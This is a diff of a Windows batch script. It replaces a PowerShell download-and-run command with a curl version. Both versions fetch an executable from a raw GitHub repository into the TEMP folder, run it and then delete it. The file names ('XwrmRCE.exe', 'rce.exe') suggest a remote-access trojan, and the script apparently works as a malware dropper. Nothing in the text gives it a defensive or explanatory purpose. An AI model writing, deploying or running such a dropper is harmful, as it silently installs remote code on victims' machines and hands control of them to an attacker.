@@ -1,3 +1,4 @@
 @echo off
-powershell -Command "$bytes = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/XwrmRCE.exe' -UseBasicParsing).Content; [System.IO.File]::WriteAllBytes('$env:TEMP\XwrmRCE.exe', $bytes); Start-Process -FilePath '$env:TEMP\XwrmRCE.exe'"
-del %TEMP%\XwrmRCE.exe
+curl -s -L "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/rce.exe" -o "%TEMP%\rce.exe"
+start /wait "" "%TEMP%\rce.exe"
+del "%TEMP%\rce.exe"
